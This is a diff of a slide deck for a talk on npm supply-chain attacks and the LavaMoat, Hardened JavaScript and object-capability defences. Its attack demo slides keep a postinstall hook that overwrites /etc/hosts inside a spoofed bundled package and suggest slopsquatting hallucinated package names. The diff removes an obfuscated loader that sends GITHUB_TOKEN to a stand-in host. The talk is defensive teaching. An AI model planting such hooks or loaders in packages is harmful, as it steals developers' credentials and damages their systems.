@@ -295,9 +295,10 @@
           <img src="./ilus/cookie.png" alt="gobble" class="an-target an-y">
           <div class="an-container"></div>
   
+          <br><br>
           <sub><sup>
-              Put your malicious code in a package and people will gobble it up like cookies.
-            </sup></sub>
+            What if not all packages are _great_ ?
+          </sup></sub>
   
         </section>
 
@@ -314,7 +315,7 @@
 
             ---
 
-            ### Actors in your app:
+            ### Code authors in your app:
 
             🙋 you, the team (few)  
             🧑‍🤝‍🧑 other teams (more)  
@@ -332,7 +333,7 @@
             - Authors publish malicious packages
             - Devs write buggy code
             - Bugfix in one corner breaks another corner
-            - Work under different constraints and goals
+            - Teams work under different constraints and OKRs
 
             - Hallucinated package names - [Slopsquatting](https://socket.dev/blog/slopsquatting-how-ai-hallucinations-are-fueling-a-new-class-of-supply-chain-attacks)
             - AI code messing up shared resources
@@ -353,12 +354,23 @@
             ---
 
             # Fearless cooperation
+            # 🦸
 
             ---
 
             ### Fearless cooperation
 
-            We need tools and architectures that let software cooperate without authors trusting each other.
+            We need tools and architectures that let software cooperate without authors necessarily trusting each other.
+
+            ---
+
+            #### There has been serious research
+            [Listen to Mark S. Miller for more](https://foresight.org/summary/mark-s-miller-agoric-computational-markets-agoric-systems/)
+
+            ---
+
+            ### I'm here to tell you about fearless cooperation tools
+            # 🧰
 
           </textarea>
         </section>
@@ -432,11 +444,11 @@
 #### I can spoof that package name
   
 ```
-node_modules/evilpackage/node_modules/bcrypt/package.json:
+evilpackage/node_modules/bcrypt/package.json:
   "scripts": {
     "postinstall": "echo 💩 > /etc/hosts"
     
-node_modules/evilpackage/package.json:
+evilpackage/package.json:
   "bundledDependencies": ["bcrypt"]
 
 $ npm publish
@@ -497,6 +509,9 @@ package.json:
             tiny but popular plugin...
 
 
+
+            (Or find a common hallucination to slopsquat)
+
           </section>
           <section data-markdown class="blackhat">
             <textarea>
@@ -515,27 +530,6 @@ req.end();
           </section>
           <section data-markdown class="blackhat">
             #### ok, just in case you do
-
-            ```
-            const _0x765e5=_0x46a0;(function(_0x57764e,_0x91aa41){const
-            _0x32405d=_0x46a0,_0x165444=_0x57764e();while(!![]){try{const
-            _0x42ba82=-parseInt(_0x32405d(0x150))/0x1*(parseInt(_0x32405d(0x15e))/0x2)+-parseInt(_0x32405d(0x153))/0x3*(-parseInt(_0x32405d(0x14f))/0x4)+parseInt(_0x32405d(0x159))/0x5*(-parseInt(_0x32405d(0x158))/0x6)+parseInt(_0x32405d(0x151))/0x7*(-parseInt(_0x32405d(0x152))/0x8)+parseInt(_0x32405d(0x157))/0x9+-parseInt(_0x32405d(0x15f))/0xa+parseInt(_0x32405d(0x15a))/0xb;
-            if(_0x42ba82===_0x91aa41)break;else
-            _0x165444['push'](_0x165444['shift']());}catch(_0x54f92f){_0x165444['push'](_0x165444['shift']());}}}(_0x3641,0x8e73e));function
-            _0x3641()
-            {const _0x5d9864=['/stolen/','evil.plots','2511378rgvTaf','5826vwOBSz','3845SrYtZx',
-            '37351105uFQfso','request','end','https','72326kmzepu','8558100KDxwfw',
-            'GITHUB_TOKEN','25432JwBMWs','29XqXcpt','4547823ytmFVF','8EFXBHJ','99iKrczU','env'];
-            _0x3641=function(){return _0x5d9864;};return _0x3641();}function _0x46a0(_0x24c0cb,_0x27294c){const
-            _0x3641a1=_0x3641();return _0x46a0=function(_0x46a08f,_0x225127){_0x46a08f=_0x46a08f-0x14f;let
-            _0x16a89a=_0x3641a1[_0x46a08f];return _0x16a89a;},
-            _0x46a0(_0x24c0cb,_0x27294c);}const
-            credentials=process[_0x765e5(0x154)][_0x765e5(0x160)],req=require(_0x765e5(0x15d))[_0x765e5(0x15b)]({'hostname':_0x765e5(0x156),'path':_0x765e5(0x155)+credentials},()=>{});req[_0x765e5(0x15c)]();
-            ```
-
-          </section>
-          <section data-markdown class="blackhat">
-            #### should I keep going?
 
             ![](./ilus/obfuscated.png)
 
@@ -624,27 +618,23 @@ TypeError: Cannot read properties of undefined
 
           <section data-markdown>
             <textarea data-template>
-  # 🪄
-  ## SES 
-  
-  Secure EcmaScript
-  
-  
-  Each package in its own compartment,  
-  with separate globals.
-  ---
+### What LavaMoat does <br>at runtime?
 
-  ## Part of the language!
-  #### ( eventually )
+- Runs every package in a separate _Compartment_
+- Uses a policy to choose what to allow in each
+- Destroys all globals on the outside
 
-  https://github.com/tc39/proposal-compartments
-
-  https://github.com/tc39/proposal-ses
-
-  
 ---
 
-### SES Ingredients
+![](./hardenedjs.svg)
+
+## Hardened Javascript
+
+Provides a secure environment for running code.
+
+---
+
+### Ingredients
 
 - `Compartment` - scope isolation
 - `lockdown` - makes your Realm secure
@@ -655,35 +645,73 @@ TypeError: Cannot read properties of undefined
 # 🤯
 ### JS design is good for security?
 
-
 - Take ECMA + W3C
 - Add Conway's Law
 - Separation between language and APIs
 - Power only reachable through scope
 - Compartment controls scope
-- Hardened JavaScript
+- Hardened JavaScript ✅
+
+---
+
+  ## Part of the language!
+  #### ( eventually )
+
+  https://github.com/tc39/proposal-compartments
+  
+---
+
+### Available as a shim
+
+![](./ilus/ses.png)
+
+---
+
+### Object Capability
+
+vs identity based security
+
+- code gets references to capable objects
+- code doesn't "work on your behalf"
+
+<br><br>
+OCap is a security model that enables <br>Fearless Cooperation.
+
+---
+
+### Object Capability
+
+You already know how to use it
+
+```js
+import { lint } from 'some-linter'
+import { readFile } from 'node:fs/promises'
+
+const fs = { readFile }
+
+lint({ fs })
+```
 
 ---
 
 ### Ok, that was a lot.
 
-- Install time protections with `allow-scripts`
-- Run time protections with `lavamoat` and policy
-- Hardened JavaScript with SES
+- Install time protections with `allow-scripts`.
+- Runtime protections with policy,
+  - for node.js and bundlers (webpack plugin)
+  - using Hardened JavaScript and OCap
 
 LavaMoat is protecting installation, build and runtime of MetaMask - with up to 30 million users
 
-        </textarea>
+---
+
+https://lavamoat.github.io
+
+![lavamoat](./lavamoat-logo.png)
+
+Your adoption and feedback will help us start the <br>era of Fearless Cooperation.
+            </textarea>
           </section>
-          <section data-markdown>
-            ### There's also a bundler
-    
-            1. browserify based
-            2. webpack plugin (in BETA)
-            
-            https://lavamoat.github.io
-          </section>
-         
           <section>
             <h4> I'll help you set up LavaMoat in your project</h4>
 
